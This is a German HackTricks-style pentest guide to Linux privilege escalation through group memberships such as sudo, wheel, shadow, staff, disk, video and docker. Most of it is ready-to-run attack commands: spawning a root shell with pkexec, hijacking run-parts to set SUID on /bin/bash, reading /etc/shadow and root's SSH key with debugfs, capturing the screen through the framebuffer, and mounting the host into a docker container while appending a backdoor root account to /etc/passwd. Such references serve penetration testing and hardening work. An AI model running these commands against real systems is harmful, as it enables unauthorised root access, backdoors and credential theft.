# Interessante Gruppen - Linux Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Sudo/Admin Gruppen

### **PE - Method 1**

**Manchmal**, **standardmäßig (oder weil einige Programme es benötigen)** findet man in der **/etc/sudoers**-Datei einige dieser Zeilen:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
Das bedeutet, dass **jeder Benutzer, der zur Gruppe sudo oder admin gehört, alles als sudo ausführen kann**.

Wenn dies der Fall ist, um **root zu werden, kannst du einfach ausführen**:
```
sudo su
```
### PE - Methode 2

Finde alle suid binaries und prüfe, ob das Binary **Pkexec** vorhanden ist:
```bash
find / -perm -4000 2>/dev/null
```
Wenn Sie feststellen, dass **pkexec is a SUID binary** und Sie zur Gruppe **sudo** oder **admin** gehören, könnten Sie wahrscheinlich Binaries als sudo mit `pkexec` ausführen.  
Das liegt daran, dass das typischerweise die Gruppen sind, die in der **polkit policy** stehen. Diese Richtlinie legt im Wesentlichen fest, welche Gruppen `pkexec` verwenden dürfen. Prüfen Sie es mit:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Dort findest du, welche Gruppen berechtigt sind, **pkexec** auszuführen, und **standardmäßig** erscheinen in einigen Linux-Distributionen die Gruppen **sudo** und **admin**.

Um **root zu werden, kannst du** ausführen:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
Wenn du versuchst, **pkexec** auszuführen und folgenden **Fehler** bekommst:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**Es liegt nicht daran, dass du keine Berechtigungen hast, sondern daran, dass du ohne GUI nicht verbunden bist**. Und es gibt einen Workaround für dieses Problem hier: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Du brauchst **2 verschiedene ssh sessions**:
```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
## Wheel-Gruppe

**Manchmal**, **standardmäßig**, findet man in der Datei **/etc/sudoers** diese Zeile:
```
%wheel	ALL=(ALL:ALL) ALL
```
Das bedeutet, dass **jeder Benutzer, der zur Gruppe wheel gehört, beliebige Befehle mit sudo ausführen kann**.

Wenn das der Fall ist, um **root zu werden, kannst du einfach folgendes ausführen**:
```
sudo su
```
## Shadow-Gruppe

Benutzer der **Gruppe shadow** können die **/etc/shadow** Datei **lesen**:
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
Also, lies die Datei und versuche, **crack some hashes**.

Kurze Nuance zum Lock-Status beim triaging von hashes:
- Einträge mit `!` oder `*` sind in der Regel nicht interaktiv für Passwortanmeldungen.
- `!hash` bedeutet in der Regel, dass ein Passwort gesetzt und dann gesperrt wurde.
- `*` bedeutet meist, dass nie ein gültiger Passwort-Hash gesetzt wurde.
Das ist nützlich zur Klassifizierung von Konten, selbst wenn direkte Anmeldung blockiert ist.

## Staff-Gruppe

**staff**: Ermöglicht Benutzern, lokale Änderungen am System (`/usr/local`) vorzunehmen, ohne Root-Rechte zu benötigen (beachte, dass ausführbare Dateien in `/usr/local/bin` in der PATH-Variable jedes Benutzers enthalten sind, und sie gegebenenfalls die ausführbaren Dateien in `/bin` und `/usr/bin` mit demselben Namen "überschreiben" können). Vergleiche mit der Gruppe "adm", die eher mit Monitoring/Sicherheit zu tun hat. [\[source\]](https://wiki.debian.org/SystemGroups)

In Debian-Distributionen zeigt die `$PATH`-Variable, dass `/usr/local/` mit der höchsten Priorität ausgeführt wird, unabhängig davon, ob du ein privilegierter Benutzer bist oder nicht.
```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
Wenn wir einige Programme in `/usr/local` hijacken können, können wir leicht root erlangen.

Ein Hijack des Programms `run-parts` ist eine einfache Möglichkeit, root zu erlangen, da viele Programme `run-parts` ausführen oder ähnliche Mechanismen nutzen (z. B. crontab, beim ssh-Login).
```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```
oder beim Login einer neuen ssh-Session.
```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```
**Exploit**
```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```
## Disk-Gruppe

Dieses Privileg ist nahezu **gleichwertig mit root-Zugriff**, da man auf alle Daten innerhalb der Maschine zugreifen kann.

Dateien:`/dev/sd[a-z][1-9]`
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
Beachte, dass du mit debugfs auch **Dateien schreiben** kannst. Zum Beispiel, um `/tmp/asd1.txt` nach `/tmp/asd2.txt` zu kopieren, kannst du Folgendes tun:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
Wenn du jedoch versuchst, **Dateien zu schreiben, die root gehören** (wie `/etc/shadow` oder `/etc/passwd`), erhältst du einen "**Permission denied**"-Fehler.

## Video-Gruppe

Mit dem Befehl `w` kannst du herausfinden, **wer am System angemeldet ist**, und er zeigt eine Ausgabe wie die folgende:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
Die **tty1** bedeutet, dass der Benutzer **yossi physisch an einem Terminal auf der Maschine** angemeldet ist.

Die **video group** hat Zugriff, die Bildschirmausgabe anzusehen. Grundsätzlich kannst du die Bildschirme beobachten. Um das zu tun, musst du das **aktuelle Bild auf dem Bildschirm erfassen** als Rohdaten und die Auflösung ermitteln, die der Bildschirm verwendet. Die Bildschirmdaten können in `/dev/fb0` gespeichert werden und die Auflösung findest du unter `/sys/class/graphics/fb0/virtual_size`.
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
Um das **raw image** zu **öffnen** kannst du **GIMP** verwenden: wähle die **`screen.raw`**-Datei und als Dateityp **Raw image data** aus:

![](<../../../images/image (463).png>)

Ändere anschließend Width und Height auf die auf dem Bildschirm verwendeten Werte und probiere verschiedene Image Types aus (wähle die Option, die den Bildschirm am besten darstellt):

![](<../../../images/image (317).png>)

## Root Group

Es sieht so aus, dass standardmäßig **Mitglieder der root group** möglicherweise Zugriff haben, um einige **service**-Konfigurationsdateien, einige **libraries**-Dateien oder andere **interessante Dinge** zu ändern, die zur Eskalation von Privilegien verwendet werden könnten...

**Prüfe, welche Dateien root-Mitglieder ändern können**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Docker Group

Du kannst das root filesystem der host machine auf das instance’s volume mounten, sodass beim Start der instance sofort ein `chroot` in dieses volume geladen wird. Das verschafft dir damit effektiv root auf der host machine.
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```
Finally, if you don't like any of the suggestions of before, or they aren't working for some reason (docker api firewall?) you could always try to **run a privileged container and escape from it** as explained here:


{{#ref}}
../container-security/
{{#endref}}

If you have write permissions over the docker socket read [**this post about how to escalate privileges abusing the docker socket**](../index.html#writable-docker-socket)**.**


{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}


{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## lxc/lxd Gruppe


{{#ref}}
./
{{#endref}}

## Adm-Gruppe

Normalerweise haben **Mitglieder** der Gruppe **`adm`** die Berechtigung, **Logdateien zu lesen**, die sich in _/var/log/_ befinden.\
Daher, wenn Sie einen Benutzer in dieser Gruppe kompromittiert haben, sollten Sie auf jeden Fall einen **Blick in die Protokolle** werfen.

## Backup / Operator / lp / Mail Gruppen

Diese Gruppen sind oft eher **credential-discovery**-Vektoren als direkte Root-Vektoren:
- **backup**: kann Archive mit configs, keys, DB dumps oder tokens offenbaren.
- **operator**: plattformspezifischer operativer Zugriff, der sensitive Laufzeitdaten leak kann.
- **lp**: print queues/spools können Dokumentinhalte enthalten.
- **mail**: mail spools können Reset-Links, OTPs und interne Zugangsdaten offenlegen.

Behandeln Sie eine Mitgliedschaft hier als einen hochgradig wertvollen Befund zur Datenexposition und pivot through password/token reuse.

## Auth-Gruppe

Unter OpenBSD kann die **auth**-Gruppe normalerweise in die Ordner _**/etc/skey**_ und _**/var/db/yubikey**_ schreiben, falls diese verwendet werden.\
Diese Berechtigungen können mit dem folgenden Exploit missbraucht werden, um **escalate privileges** zu root: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)

{{#include ../../../banners/hacktricks-training.md}}
